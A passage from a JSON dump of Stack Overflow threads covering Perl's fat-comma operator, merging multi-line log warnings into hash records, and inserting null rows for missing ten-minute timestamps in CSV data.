"body": "Is <code>_cwd = cwd()</code> a typo of <code>_cwd =&gt; cwd()</code>?"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1457454520, "post_id": 35861919, "comment_id": 59409325, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/4093895/how-does-double-arrow-operator-work-in-perl\">How does double arrow (=&gt;) operator work in Perl?</a>"}], "answers": [{"tags": [], "owner": {"reputation": 101058, "user_id": 318758, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9870a37447a4ae811096e8e7d10ed3f9?s=128&d=identicon&r=PG", "display_name": "Joni", "link": "https://stackoverflow.com/users/318758/joni"}, "is_accepted": false, "score": 7, "last_activity_date": 1457425837, "last_edit_date": 1457425837, "creation_date": 1457424687, "answer_id": 35862154, "question_id": 35861919, "link": "https://stackoverflow.com/questions/35861919/how-to-understand-such-this-kind-of-variable-to-combine-and-other-charcters-in/35862154#35862154", "title": "How to understand such this kind of variable to combine _ and other charcters in Perl?", "body": "<p><a href=\"http://perldoc.perl.org/perlop.html#Comma-Operator\" rel=\"noreferrer\">From the reference</a>:</p>\n\n<blockquote>\n  <p>The <code>=&gt;</code> operator (sometimes pronounced \"fat comma\") is a synonym for the comma except that it causes a word on its left to be interpreted as a string if it begins with a letter or underscore and is composed only of letters, digits and underscores. This includes operands that might otherwise be interpreted as operators, constants, single number v-strings or function calls. If in doubt about this behavior, the left operand can be quoted explicitly.</p>\n</blockquote>\n\n<pre><code>my %hash = ('a' =&gt; 'b', 'c' =&gt; 'd');\n</code></pre>\n\n<p>can be written as</p>\n\n<pre><code>my %hash = (a =&gt; 'b', c =&gt; 'd');\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 64, "user_id": 5615328, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mIzTu.png?s=128&g=1", "display_name": "winterli", "link": "https://stackoverflow.com/users/5615328/winterli"}, "is_accepted": false, "score": 0, "last_activity_date": 1457838145, "creation_date": 1457838145, "answer_id": 35965954, "question_id": 35861919, "link": "https://stackoverflow.com/questions/35861919/how-to-understand-such-this-kind-of-variable-to-combine-and-other-charcters-in/35965954#35965954", "title": "How to understand such this kind of variable to combine _ and other charcters in Perl?", "body": "<p>thanks for everyone, Now I think _argv and _cwd both are just a variable name, equals to \"_argv\" and \"_cwd\". </p>\n"}], "owner": {"reputation": 64, "user_id": 5615328, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mIzTu.png?s=128&g=1", "display_name": "winterli", "link": "https://stackoverflow.com/users/5615328/winterli"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 60, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1457838145, "creation_date": 1457423791, "last_edit_date": 1457425519, "question_id": 35861919, "link": "https://stackoverflow.com/questions/35861919/how-to-understand-such-this-kind-of-variable-to-combine-and-other-charcters-in", "title": "How to understand such this kind of variable to combine _ and other charcters in Perl?", "body": "<p>How to understand such this kind of value in Perl?</p>\n\n<pre><code>my %opt = ( _argv =&gt; join\uff08\" \",@ARGV),_cwd = cwd()).\n</code></pre>\n\n<p>Are <code>_argv</code> and <code>_cwd</code> both strings?</p>\n"}, {"tags": ["regex", "linux", "perl", "file"], "comments": [{"owner": {"reputation": 1040, "user_id": 3882175, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/93YQI.jpg?s=128&g=1", "display_name": "Shantesh", "link": "https://stackoverflow.com/users/3882175/shantesh"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1457426830, "post_id": 35861054, "comment_id": 59389654, "body": "@zdim i have modified the script for my post here. can you help me to find the solution for my question."}], "answers": [{"tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 1, "last_activity_date": 1560041892, "last_edit_date": 1560041892, "creation_date": 1457421781, "answer_id": 35861374, "question_id": 35861054, "link": "https://stackoverflow.com/questions/35861054/how-to-grep-required-till-some-condition-while-file-processing-in-perl-scripts/35861374#35861374", "title": "how to grep required till some condition while file processing in perl scripts", "body": "<p>You need very small additions to your code.</p>\n\n<p>The only possibility other than matching <code>/^Warning:/</code> is the continuation of it on the next line(s), which is exactly what you want.  So you can add an <code>else</code> branch and in it append the line to the last previously matched '<em>Warning</em>'. This handles multiple such lines as well, they all get appended to the last '<em>Warning</em>', one after another.\nSo you need to: </p>\n\n<p>1) Remember the position in the array of the last match ('<em>Warning</em>')</p>\n\n<p>2) Add an <code>else</code> in which you append the line to that last '<em>Warning</em>', using the last value of the counter. \n<br> For this to work you now have to <code>chomp</code> the line.\n<br></p>\n\n<pre><code>use strict;\nuse warnings;\n\nopen(FH,\"/home/goudar/Desktop/1.log\") or die !$;\n\nmy $subStepValues;   # added missing declarations\nmy $subsSteps = { };\n\nmy $cnt = -1;                                   # added\nwhile (&lt;FH&gt;) {\n    chomp(my $line = $_);                       # added\n    if ($line =~ m/^Warning: (.*)$/) {\n        $cnt++;                                 # added\n        my $date1 = `date`;\n        chomp($date1);\n        $subStepValues = { \n            Warning =&gt; $1, \n            Warning_timeStamp =&gt; $date1,\n        };\n        push @{ $subsSteps-&gt;{'subStepValues'} }, $subStepValues;\n    }   \n    else {                                      # added\n        $subsSteps-&gt;{'subStepValues'}-&gt;[$cnt]-&gt;{'Warning'} .= \" $line\";\n    }   \n}\nclose(FH);\n\nforeach my $ss (@{$subsSteps-&gt;{'subStepValues'}}) { # added, print\n    foreach my $key (keys %{$ss}) {\n        print \"$key =&gt; $ss-&gt;{$key}\\n\";\n    }   \n}\n</code></pre>\n\n<p>This prints all lines belonging to each '<em>Warning</em>'.</p>\n\n<p>I recommend three-argument open, <code>open my $fh, '&lt;', $infile</code>, and then <code>while ($fh) { }</code>.</p>\n\n<hr>\n\n<p>Alternatively, you can read the whole file into one string (or read it into an array and join) and remove new lines. Then split that string on <code>Warning:</code> (drop the first element, an empty string), or match the same way as you do, but globally (<code>/g</code> modifier).  </p>\n\n<p>This forms an array where each element is a string with all text belonging to its<code>/^Warning:/</code>. Then make another pass over that array, to add that time stamp and put it all into your data structure.</p>\n"}, {"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 0, "last_activity_date": 1457430534, "creation_date": 1457430534, "answer_id": 35864011, "question_id": 35861054, "link": "https://stackoverflow.com/questions/35861054/how-to-grep-required-till-some-condition-while-file-processing-in-perl-scripts/35864011#35864011", "title": "how to grep required till some condition while file processing in perl scripts", "body": "<p>I would suggest that what you really want, is to split your record on something other than linefeed. Then you can use multi-line pattern matches to extract your content. </p>\n\n<p>Looking at it - the 'end of record' appears to be <code>)</code>.</p>\n\n<p>So:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\nuse Data::Dumper;\n\nmy @warnings;\n\nopen my $input, '&lt;', '/home/goudar/Desktop/1.log' or die $!;\n\nlocal $/ = ')';\nwhile (&lt;$input&gt;) {\n    my $timestamp      = time();\n    my $formatted_time = localtime(); \n    my ($code)         = m/\\(([\\w\\d\\-]+)\\)/;\n    my ($message)      = m/Warning: (.*)\\z/ms;\n    next unless $code;\n    push( @warnings, { time =&gt; $timestamp, formatted_time =&gt; $formatted_time, \n                       msg  =&gt; $message,   code           =&gt; $code } );\n}\nclose ( $input ); \n\n\nprint Dumper \\@warnings;\n</code></pre>\n\n<p>This gives (with your content):</p>\n\n<pre><code>$VAR1 = [\n          {\n            'msg' =&gt; 'No clock-gating check is inferred for clock clk_12800 \nat pins i_osc/i_osc_top/i_clk_div/g817/S and i_osc/i_osc_top/i_clk_div/g817/A1 of cell i_osc/i_osc_top/i_clk_div/g817. (PTE-060)',\n            'time' =&gt; 1457430459,\n            'code' =&gt; 'PTE-060',\n            'formatted_time' =&gt; 'Tue Mar  8 09:47:39 2016'\n          },\n          {\n            'formatted_time' =&gt; 'Tue Mar  8 09:47:39 2016',\n            'msg' =&gt; 'Virtual clock \\'clk_vir\\' cannot be made propagated. (UITE-316)',\n            'time' =&gt; 1457430459,\n            'code' =&gt; 'UITE-316'\n          },\n          {\n            'formatted_time' =&gt; 'Tue Mar  8 09:47:39 2016',\n            'code' =&gt; 'UITE-316',\n            'msg' =&gt; 'Virtual clock \\'clk_ext\\' cannot be made propagated. (UITE-316)',\n            'time' =&gt; 1457430459\n          },\n          {\n            'formatted_time' =&gt; 'Tue Mar  8 09:47:39 2016',\n            'msg' =&gt; 'Net i_obr/i_obr34/rec2 has been annotated with max resistance\nusing the set_resistance command.  This takes precedence over\nvalues from parasitics. (PARA-047)',\n            'time' =&gt; 1457430459,\n            'code' =&gt; 'PARA-047'\n          },\n          {\n            'msg' =&gt; 'Net i_obr/i_obr34/rec2 has been annotated with min resistance\nusing the set_resistance command.  This takes precedence over\nvalues from parasitics. (PARA-047)',\n            'time' =&gt; 1457430459,\n            'code' =&gt; 'PARA-047',\n            'formatted_time' =&gt; 'Tue Mar  8 09:47:39 2016'\n          }\n        ];\n</code></pre>\n\n<p>Whilst we're at it:</p>\n\n<ul>\n<li>3 argument <code>open</code> with lexical filehandles is much better style. </li>\n<li><code>my $line = $_</code> is redundant. You can do <code>while ( my $line = &lt;$filehandle&gt; ) {</code> </li>\n<li>you don't need it if all you're doing is regex anyway, because the default match target is <code>$_</code></li>\n<li>unclear what you're doing with <code>$substeps</code> so I've used an array in the above for clarity.</li>\n<li>It's usually a good idea to keep an unformatted time, because that enables sorting/searching etc. </li>\n<li>the above captures linefeeds in your messages. This can be easily remedied by <code>$message =~ tr/\\n//d;</code></li>\n</ul>\n"}], "owner": {"reputation": 1040, "user_id": 3882175, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/93YQI.jpg?s=128&g=1", "display_name": "Shantesh", "link": "https://stackoverflow.com/users/3882175/shantesh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1898, "favorite_count": 1, "accepted_answer_id": 35861374, "answer_count": 2, "score": 1, "last_activity_date": 1560041892, "creation_date": 1457420619, "last_edit_date": 1457426782, "question_id": 35861054, "link": "https://stackoverflow.com/questions/35861054/how-to-grep-required-till-some-condition-while-file-processing-in-perl-scripts", "title": "how to grep required till some condition while file processing in perl scripts", "body": "<p>I want to capture and make one line for the following varieties of warnings</p>\n\n<p>here's the code snippet which i am using for gathering different warnings and after observing warnings pattern i have warnings of different lines and i want join next line warning part in one line and assign to it a hash ref.</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nopen(FH,\"/home/goudar/Desktop/1.log\") or die !$;\n\nwhile(&lt;FH&gt;){\n    my $line = $_;\n    if($line =~ m/^Warning: (.*)$/){\n                my $date1 = `date`;\n                chomp($date1);\n                $subStepValues = {\n                    Warning =&gt; $1,\n                    Warning_timeStamp =&gt; $date1,\n                };\n                push @{$subsSteps-&gt;{'subStepValues'}}, $subStepValues;\n            }\n}\nclose(FH);\n</code></pre>\n\n<p><strong>FILE</strong></p>\n\n<pre><code>Warning: No clock-gating check is inferred for clock clk_12800 \nat pins i_osc/i_osc_top/i_clk_div/g817/S and i_osc/i_osc_top/i_clk_div/g817/A1 of cell i_osc/i_osc_top/i_clk_div/g817. (PTE-060)\nWarning: Virtual clock 'clk_vir' cannot be made propagated. (UITE-316)\nWarning: Virtual clock 'clk_ext' cannot be made propagated. (UITE-316)\nWarning: Net i_obr/i_obr34/rec2 has been annotated with max resistance\nusing the set_resistance command.  This takes precedence over\nvalues from parasitics. (PARA-047)\nWarning: Net i_obr/i_obr34/rec2 has been annotated with min resistance\nusing the set_resistance command.  This takes precedence over\nvalues from parasitics. (PARA-047)\n</code></pre>\n"}, {"tags": ["perl", "date", "datetime", "awk"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1457420342, "post_id": 35860915, "comment_id": 59386307, "body": "Well, yes, in a number of ways.  Which way are you approaching it -- can you show what part of it is not working?  Or do you not know how to go at it at all?"}, {"owner": {"reputation": 35, "user_id": 5312268, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35a0d53a7be1f12fc011e45c76f0148e?s=128&d=identicon&r=PG&f=1", "display_name": "Priyanka Tiwari", "link": "https://stackoverflow.com/users/5312268/priyanka-tiwari"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1457420877, "post_id": 35860915, "comment_id": 59386557, "body": "you are right, I know how to replace a missing word or blank space with null but no idea how to compare and insert null based on date and time stamp...could you please help ? this has become a road block in my reporting database and due to this populated charts are showing wrong data."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1457422127, "post_id": 35860915, "comment_id": 59387157, "body": "This is an interesting question. I just think that it would be good that you give us something that you are trying to work with.  Also, I&#39;d suggest that you edit the question -- it is good that you are showing input but don&#39;t need to show all lines."}, {"owner": {"reputation": 35, "user_id": 5312268, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35a0d53a7be1f12fc011e45c76f0148e?s=128&d=identicon&r=PG&f=1", "display_name": "Priyanka Tiwari", "link": "https://stackoverflow.com/users/5312268/priyanka-tiwari"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1457422484, "post_id": 35860915, "comment_id": 59387328, "body": "OK! please see what i tried. Edited in question. all my attempt is doing is to compare both files and printing a merge output but i see that its repeatedly printing missing date and time...."}], "answers": [{"comments": [{"owner": {"reputation": 30226, "user_id": 2107876, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/975e7190aac72397465126f04f46f3f6?s=128&d=identicon&r=PG", "display_name": "laune", "link": "https://stackoverflow.com/users/2107876/laune"}, "edited": false, "score": 0, "creation_date": 1457433181, "post_id": 35864443, "comment_id": 59393875, "body": "This sort may not be stable, so you have no guarantee that the first of an equal pair is from the first file, 1.csv. No need to cat and sort, use merge: <code>sort -t, -m -u -k2,2 stamps.dat stamps2.dat</code>"}], "tags": [], "owner": {"reputation": 35, "user_id": 5312268, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35a0d53a7be1f12fc011e45c76f0148e?s=128&d=identicon&r=PG&f=1", "display_name": "Priyanka Tiwari", "link": "https://stackoverflow.com/users/5312268/priyanka-tiwari"}, "is_accepted": false, "score": 0, "last_activity_date": 1457431751, "creation_date": 1457431751, "answer_id": 35864443, "question_id": 35860915, "link": "https://stackoverflow.com/questions/35860915/insert-null-values-in-missing-rows-of-file/35864443#35864443", "title": "insert null values in missing rows of file", "body": "<p>here is the answer..  </p>\n\n<p>\ncat 1.csv 2.csv|sort -u -t, -k2,2\n</p>\n"}, {"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457446886, "post_id": 35864973, "comment_id": 59403492, "body": "Like my original solution, this doesn&#39;t add a line for <code>2016-02-06,23:50:00</code> at the end"}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 1, "last_activity_date": 1457433169, "creation_date": 1457433169, "answer_id": 35864973, "question_id": 35860915, "link": "https://stackoverflow.com/questions/35860915/insert-null-values-in-missing-rows-of-file/35864973#35864973", "title": "insert null values in missing rows of file", "body": "<p>I'd actually <em>not</em> cross reference a new csv file, and instead do it like this:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\nuse Time::Piece; \n\nmy $last_timestamp; \nmy $interval = 600; \n\n#read stdin line by line\nwhile ( &lt;&gt; ) {\n   #extract date and time from this line. \n   my ( $date, $time, @fields ) = split /,/; \n   #parse the timestamp\n   my $timestamp = Time::Piece -&gt; strptime ( $date . $time, \"%Y-%m-%d%H:%M:%S\" );\n   #set last if undefined. \n   $last_timestamp //= $timestamp; \n   #if there's a gap... :\n   if (  $last_timestamp + $interval &lt;  $timestamp ) { \n       #print \"GAP detected at $timestamp: \",$timestamp - $last_timestamp,\"\\n\";\n       #print lines to fill in the gap\n       for ( ($timestamp - $last_timestamp) % 600 ) { \n           $last_timestamp += 600;\n           print join ( \",\", $last_timestamp -&gt; strftime(\"%Y-%m-%d,%H:%M:%S\"),  (\"null\")x6),\"\\n\";\n       }\n   }\n   $last_timestamp = $timestamp;\n   print;\n}\n</code></pre>\n\n<p>Which for your sample gives me lines (snipped for brevity):</p>\n\n<pre><code>2016-02-06,22:40:00,ujjawal,36072-2,MT,13,0,1\n2016-02-06,22:50:00,null,null,null,null,null,null\n2016-02-06,23:00:00,ujjawal,36072-2,MT,20,0,2\n</code></pre>\n\n<p>Note - this is assuming the timestamps are exactly 600s apart. You can adjust the logic a little if that isn't a valid assumption, but it depends exactly what you're trying to get at that point. </p>\n"}, {"tags": [], "owner": {"reputation": 30226, "user_id": 2107876, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/975e7190aac72397465126f04f46f3f6?s=128&d=identicon&r=PG", "display_name": "laune", "link": "https://stackoverflow.com/users/2107876/laune"}, "is_accepted": false, "score": 0, "last_activity_date": 1457433554, "creation_date": 1457433554, "answer_id": 35865118, "question_id": 35860915, "link": "https://stackoverflow.com/questions/35860915/insert-null-values-in-missing-rows-of-file/35865118#35865118", "title": "insert null values in missing rows of file", "body": "<p>...or a shell script: </p>\n\n<pre><code>#! /bin/bash\nset -e\n\nfile=$1\ntoday=$(head -1 $file | cut -d, -f1)\n\nline=0\nfor (( h = 0 ; h &lt; 24 ; h++ ))\ndo\n  for (( m = 0 ; m &lt; 60 ; m += 10 ))\n  do\n    stamp=$(printf \"%02d:%02d:00\" $h $m)\n    if [ $line -eq 0 ]; then IFS=',' read date time data; fi\n    if [ \"$time\" = \"$stamp\" ]; then\n      echo $date,$time,$data\n      line=0\n    else\n      echo $today,$stamp,null,null,null,null,null,null\n      line=1\n    fi\n  done\ndone &lt;$file\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1467889860, "last_edit_date": 1467889860, "creation_date": 1457445135, "answer_id": 35869230, "question_id": 35860915, "link": "https://stackoverflow.com/questions/35860915/insert-null-values-in-missing-rows-of-file/35869230#35869230", "title": "insert null values in missing rows of file", "body": "<p>I would write it like this in Perl</p>\n\n<p>This program expects the name of the input file as a parameter on the command line, and prints its output to STDOUT, which may be redirected as normal</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict;\nuse warnings 'all';\nuse feature 'say';\n\nuse Time::Piece;\nuse Time::Seconds 'ONE_MINUTE';\n\nmy $format = '%Y-%m-%d,%H:%M:%S';\nmy $delta = 10 * ONE_MINUTE;\n\nmy $next;\n\nour @ARGV = 'mydates.txt';\n\nwhile ( &lt;&gt; ) {\n\n    my $new = Time::Piece-&gt;strptime(/^([\\d-]+,[\\d:]+)/, $format);\n\n    while ( $next and $next &lt; $new ) {\n        say $next-&gt;strftime($format) . ',null' x 6;\n        $next += $delta;\n    }\n\n    print;\n\n    $next = $new + $delta;\n}\n\nwhile ( $next and $next-&gt;hms('') &gt; 0 ) {\n    say $next-&gt;strftime($format) . ',null' x 6;\n    $next += $delta;\n}\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>2016-02-06,00:00:00,ujjawal,36072-2,MT,37,0,1\n2016-02-06,00:10:00,ujjawal,36072-2,MT,37,0,1\n2016-02-06,00:20:00,ujjawal,36072-2,MT,37,0,1\n2016-02-06,00:30:00,null,null,null,null,null,null\n2016-02-06,00:40:00,ujjawal,36072-2,MT,37,0,1\n2016-02-06,00:50:00,ujjawal,36072-2,MT,42,0,2\n2016-02-06,01:00:00,ujjawal,36072-2,MT,55,0,2\n2016-02-06,01:10:00,ujjawal,36072-2,MT,41,0,2\n2016-02-06,01:20:00,ujjawal,36072-2,MT,46,0,2\n2016-02-06,01:30:00,ujjawal,36072-2,MT,56,0,3\n2016-02-06,01:40:00,ujjawal,36072-2,MT,38,0,2\n2016-02-06,01:50:00,ujjawal,36072-2,MT,49,0,2\n2016-02-06,02:00:00,ujjawal,36072-2,MT,58,0,4\n2016-02-06,02:10:00,ujjawal,36072-2,MT,43,0,2\n2016-02-06,02:20:00,ujjawal,36072-2,MT,46,0,2\n2016-02-06,02:30:00,ujjawal,36072-2,MT,61,0,2\n2016-02-06,02:40:00,ujjawal,36072-2,MT,57,0,3\n2016-02-06,02:50:00,ujjawal,36072-2,MT,45,0,2\n2016-02-06,03:00:00,ujjawal,36072-2,MT,45,0,3\n2016-02-06,03:10:00,ujjawal,36072-2,MT,51,0,2\n2016-02-06,03:20:00,ujjawal,36072-2,MT,68,0,3\n2016-02-06,03:30:00,ujjawal,36072-2,MT,51,0,2\n2016-02-06,03:40:00,ujjawal,36072-2,MT,68,0,3\n2016-02-06,03:50:00,ujjawal,36072-2,MT,67,0,3\n2016-02-06,04:00:00,ujjawal,36072-2,MT,82,0,8\n2016-02-06,04:10:00,ujjawal,36072-2,MT,82,0,5\n2016-02-06,04:20:00,ujjawal,36072-2,MT,122,0,4\n2016-02-06,04:30:00,ujjawal,36072-2,MT,133,0,3\n2016-02-06,04:40:00,ujjawal,36072-2,MT,142,0,3\n2016-02-06,04:50:00,ujjawal,36072-2,MT,202,0,1\n2016-02-06,05:00:00,ujjawal,36072-2,MT,731,1,3\n2016-02-06,05:10:00,ujjawal,36072-2,MT,372,0,7\n2016-02-06,05:20:00,ujjawal,36072-2,MT,303,0,2\n2016-02-06,05:30:00,ujjawal,36072-2,MT,389,0,3\n2016-02-06,05:40:00,ujjawal,36072-2,MT,454,0,1\n2016-02-06,05:50:00,ujjawal,36072-2,MT,406,0,6\n2016-02-06,06:00:00,ujjawal,36072-2,MT,377,0,1\n2016-02-06,06:10:00,ujjawal,36072-2,MT,343,0,5\n2016-02-06,06:20:00,ujjawal,36072-2,MT,370,0,2\n2016-02-06,06:30:00,ujjawal,36072-2,MT,343,0,9\n2016-02-06,06:40:00,ujjawal,36072-2,MT,315,0,8\n2016-02-06,06:50:00,ujjawal,36072-2,MT,458,0,3\n2016-02-06,07:00:00,ujjawal,36072-2,MT,756,1,3\n2016-02-06,07:10:00,ujjawal,36072-2,MT,913,1,3\n2016-02-06,07:20:00,ujjawal,36072-2,MT,522,0,3\n2016-02-06,07:30:00,ujjawal,36072-2,MT,350,0,7\n2016-02-06,07:40:00,ujjawal,36072-2,MT,328,0,6\n2016-02-06,07:50:00,ujjawal,36072-2,MT,775,1,3\n2016-02-06,08:00:00,ujjawal,36072-2,MT,310,0,9\n2016-02-06,08:10:00,ujjawal,36072-2,MT,308,0,6\n2016-02-06,08:20:00,ujjawal,36072-2,MT,738,1,3\n2016-02-06,08:30:00,ujjawal,36072-2,MT,294,0,6\n2016-02-06,08:40:00,ujjawal,36072-2,MT,345,0,1\n2016-02-06,08:50:00,ujjawal,36072-2,MT,367,0,6\n2016-02-06,09:00:00,ujjawal,36072-2,MT,480,0,3\n2016-02-06,09:10:00,ujjawal,36072-2,MT,390,0,3\n2016-02-06,09:20:00,ujjawal,36072-2,MT,436,0,3\n2016-02-06,09:30:00,ujjawal,36072-2,MT,1404,2,3\n2016-02-06,09:40:00,ujjawal,36072-2,MT,346,0,3\n2016-02-06,09:50:00,ujjawal,36072-2,MT,388,0,3\n2016-02-06,10:00:00,ujjawal,36072-2,MT,456,0,2\n2016-02-06,10:10:00,ujjawal,36072-2,MT,273,0,7\n2016-02-06,10:20:00,ujjawal,36072-2,MT,310,0,3\n2016-02-06,10:30:00,ujjawal,36072-2,MT,256,0,7\n2016-02-06,10:40:00,ujjawal,36072-2,MT,283,0,3\n2016-02-06,10:50:00,ujjawal,36072-2,MT,276,0,3\n2016-02-06,11:00:00,ujjawal,36072-2,MT,305,0,1\n2016-02-06,11:10:00,ujjawal,36072-2,MT,310,0,9\n2016-02-06,11:20:00,ujjawal,36072-2,MT,286,0,3\n2016-02-06,11:30:00,ujjawal,36072-2,MT,286,0,3\n2016-02-06,11:40:00,ujjawal,36072-2,MT,247,0,7\n2016-02-06,11:50:00,ujjawal,36072-2,MT,366,0,2\n2016-02-06,12:00:00,ujjawal,36072-2,MT,294,0,2\n2016-02-06,12:10:00,ujjawal,36072-2,MT,216,0,5\n2016-02-06,12:20:00,ujjawal,36072-2,MT,233,0,1\n2016-02-06,12:30:00,ujjawal,36072-2,MT,785,1,2\n2016-02-06,12:40:00,ujjawal,36072-2,MT,466,0,1\n2016-02-06,12:50:00,ujjawal,36072-2,MT,219,0,9\n2016-02-06,13:00:00,ujjawal,36072-2,MT,248,0,6\n2016-02-06,13:10:00,ujjawal,36072-2,MT,223,0,7\n2016-02-06,13:20:00,ujjawal,36072-2,MT,276,0,8\n2016-02-06,13:30:00,ujjawal,36072-2,MT,219,0,6\n2016-02-06,13:40:00,ujjawal,36072-2,MT,699,1,2\n2016-02-06,13:50:00,ujjawal,36072-2,MT,439,0,2\n2016-02-06,14:00:00,ujjawal,36072-2,MT,1752,2,3\n2016-02-06,14:10:00,ujjawal,36072-2,MT,203,0,5\n2016-02-06,14:20:00,ujjawal,36072-2,MT,230,0,7\n2016-02-06,14:30:00,ujjawal,36072-2,MT,226,0,1\n2016-02-06,14:40:00,ujjawal,36072-2,MT,195,0,6\n2016-02-06,14:50:00,ujjawal,36072-2,MT,314,0,1\n2016-02-06,15:00:00,ujjawal,36072-2,MT,357,0,2\n2016-02-06,15:10:00,ujjawal,36072-2,MT,387,0,9\n2016-02-06,15:20:00,ujjawal,36072-2,MT,1084,1,3\n2016-02-06,15:30:00,ujjawal,36072-2,MT,1295,2,3\n2016-02-06,15:40:00,ujjawal,36072-2,MT,223,0,8\n2016-02-06,15:50:00,ujjawal,36072-2,MT,254,0,1\n2016-02-06,16:00:00,ujjawal,36072-2,MT,252,0,7\n2016-02-06,16:10:00,ujjawal,36072-2,MT,268,0,1\n2016-02-06,16:20:00,ujjawal,36072-2,MT,242,0,1\n2016-02-06,16:30:00,ujjawal,36072-2,MT,254,0,9\n2016-02-06,16:40:00,ujjawal,36072-2,MT,271,0,3\n2016-02-06,16:50:00,ujjawal,36072-2,MT,244,0,7\n2016-02-06,17:00:00,ujjawal,36072-2,MT,281,0,1\n2016-02-06,17:10:00,ujjawal,36072-2,MT,190,0,8\n2016-02-06,17:20:00,ujjawal,36072-2,MT,187,0,1\n2016-02-06,17:30:00,ujjawal,36072-2,MT,173,0,9\n2016-02-06,17:40:00,ujjawal,36072-2,MT,140,0,5\n2016-02-06,17:50:00,ujjawal,36072-2,MT,147,0,6\n2016-02-06,18:00:00,ujjawal,36072-2,MT,109,0,4\n2016-02-06,18:10:00,ujjawal,36072-2,MT,99,0,1\n2016-02-06,18:20:00,ujjawal,36072-2,MT,66,0,6\n2016-02-06,18:30:00,ujjawal,36072-2,MT,67,0,4\n2016-02-06,18:40:00,ujjawal,36072-2,MT,40,0,2\n2016-02-06,18:50:00,ujjawal,36072-2,MT,52,0,3\n2016-02-06,19:00:00,ujjawal,36072-2,MT,40,0,3\n2016-02-06,19:10:00,ujjawal,36072-2,MT,30,0,2\n2016-02-06,19:20:00,ujjawal,36072-2,MT,25,0,3\n2016-02-06,19:30:00,ujjawal,36072-2,MT,35,0,4\n2016-02-06,19:40:00,ujjawal,36072-2,MT,14,0,1\n2016-02-06,19:50:00,ujjawal,36072-2,MT,97,0,7\n